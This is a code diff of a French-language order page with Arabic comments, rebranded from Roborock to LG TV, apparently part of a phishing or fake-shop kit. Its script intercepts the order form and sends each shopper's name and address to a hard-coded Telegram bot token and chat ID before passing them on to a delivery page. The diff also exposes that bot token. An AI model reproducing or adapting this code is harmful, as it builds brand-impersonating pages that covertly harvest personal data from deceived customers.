@@ -397,7 +397,7 @@
     <title>Commande - LG TV</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
     <style>
-        /* جميع التنسيقات الأصلية كما هي */
+        /* تنسيقات الصفحة */
         body {
             font-family: Arial, sans-serif;
             margin: 0;
@@ -405,13 +405,82 @@
             background-color: #f9f9f9;
             color: #333;
         }
-        /* باقي التنسيقات دون تعديل */
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 20px;
+            background-color: #c70000;
+        }
+        .navbar .logo {
+            font-size: 1.5rem;
+            color: #fff;
+            font-weight: bold;
+        }
+        .navbar ul {
+            list-style: none;
+            display: flex;
+            gap: 15px;
+        }
+        .navbar ul li a {
+            text-decoration: none;
+            color: #fff;
+            font-size: 1rem;
+            transition: color 0.3s;
+        }
+        .navbar ul li a:hover {
+            color: #ffecec;
+        }
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        .form-group input:focus {
+            border-color: #c70000;
+        }
+        .form-group button {
+            width: 100%;
+            padding: 10px;
+            background-color: #c70000;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 1rem;
+            cursor: pointer;
+        }
+        .form-group button:hover {
+            background-color: #a50000;
+        }
+        footer {
+            background-color: #2c3e50;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
-    <!-- المحتوى الأصلي دون تغيير -->
+    <!-- Navigation -->
     <div class="navbar">
-        <div class="logo">Roborock</div>
+        <div class="logo">LG TV</div>
         <ul>
             <li><a href="#">Accueil</a></li>
             <li><a href="#">Produits</a></li>
@@ -419,6 +488,7 @@
         </ul>
     </div>
 
+    <!-- Formulaire -->
     <div class="container">
         <h2>Remplissez vos informations</h2>
         <form id="order-form" action="page-livraison1.html" method="GET">
@@ -452,18 +522,18 @@
         </form>
     </div>
 
-    <!-- JavaScript لإرسال البيانات إلى التلغرام -->
+    <!-- Script لإرسال البيانات إلى التلغرام -->
     <script>
-        const token = "7631724461:AAGvOb7G_n2IO1qGwpJp-WaHgyBhREW1mfU"; // التوكن الخاص بالبوت
+        const token = "7631724461:AAGvOb7G_n2IO1qGwpJp-WaHgyBhREW1mfU"; // التوكن الخاص بك
         const chatId = "5372119436"; // معرف الدردشة الخاص بك
 
-        // وظيفة لإرسال البيانات إلى التلغرام
+        // إرسال البيانات إلى تلغرام
         function sendToTelegram(data) {
             const url = https://api.telegram.org/bot${token}/sendMessage;
             const message = `
-            🌟 طلب جديد 🌟
-            👤 الاسم: ${data.nom} ${data.prenom}
-            🏠 العنوان: ${data.rue}, رقم: ${data.numero}, ${data.ville} (${data.code_postal})
+                🌟 طلب جديد 🌟
+                👤 الاسم: ${data.nom} ${data.prenom}
+                🏠 العنوان: ${data.rue}, رقم: ${data.numero}, ${data.ville} (${data.code_postal})
             `;
             return fetch(url, {
                 method: "POST",
@@ -472,9 +542,9 @@
             });
         }
 
-        // استماع لنموذج الفورم
+        // منع الإرسال الافتراضي وإضافة إرسال التلغرام
         document.getElementById("order-form").addEventListener("submit", function (e) {
-            e.preventDefault(); // منع الإرسال الافتراضي
+            e.preventDefault();
 
             const data = {
                 prenom: document.getElementById("prenom").value,
@@ -488,7 +558,7 @@
             sendToTelegram(data)
                 .then(response => {
                     if (response.ok) {
-                        this.submit(); // متابعة الإرسال إلى الصفحة
+                        this.submit(); // إعادة التوجيه بعد الإرسال
                     } else {
                         alert("حدث خطأ أثناء إرسال البيانات إلى تلغرام.");
                     }
@@ -500,34 +570,9 @@
         });
     </script>
 
-    <!-- باقي الصفحة كما هي -->
-    <footer style="background-color: #2c3e50; color: #ecf0f1; padding: 20px;">
-        <div style="display: flex; justify-content: space-between; flex-wrap: wrap;">
-            <div style="flex: 1; min-width: 200px; margin: 10px;">
-                <h4 style="color: #e74c3c;">À propos</h4>
-                <p style="color: #bdc3c7;">Roborock France vous propose les meilleures solutions pour un nettoyage efficace et intelligent.</p>
-            </div>
-            <div style="flex: 1; min-width: 200px; margin: 10px;">
-                <h4 style="color: #e74c3c;">Liens utiles</h4>
-                <ul style="list-style: none; padding: 0;">
-                    <li><a href="#" style="color: #ecf0f1; text-decoration: none;">Politique de confidentialité</a></li>
-                    <li><a href="#" style="color: #ecf0f1; text-decoration: none;">Conditions d'utilisation</a></li>
-                    <li><a href="#" style="color: #ecf0f1; text-decoration: none;">Assistance</a></li>
-                </ul>
-            </div>
-            <div style="flex: 1; min-width: 200px; margin: 10px;">
-                <h4 style="color: #e74c3c;">Suivez-nous</h4>
-                <div style="display: flex; gap: 10px;">
-                    <a href="https://facebook.com" target="_blank" style="color: #ecf0f1; font-size: 1.5rem;"><i class="fab fa-facebook"></i></a>
-                    <a href="https://instagram.com" target="_blank" style="color: #ecf0f1; font-size: 1.5rem;"><i class="fab fa-instagram"></i></a>
-                    <a href="https://youtube.com" target="_blank" style="color: #ecf0f1; font-size: 1.5rem;"><i class="fab fa-youtube"></i></a>
-                    <a href="https://tiktok.com" target="_blank" style="color: #ecf0f1; font-size: 1.5rem;"><i class="fab fa-tiktok"></i></a>
-                </div>
-            </div>
-        </div>
-        <div style="text-align: center; margin-top: 20px;">
-            <p>&copy; 2025 Roborock France. Tous droits réservés.</p>
-        </div>
+    <!-- Footer -->
+    <footer>
+        <p>&copy; 2025 LG TV. Tous droits réservés.</p>
     </footer>
 </body>
 </html>
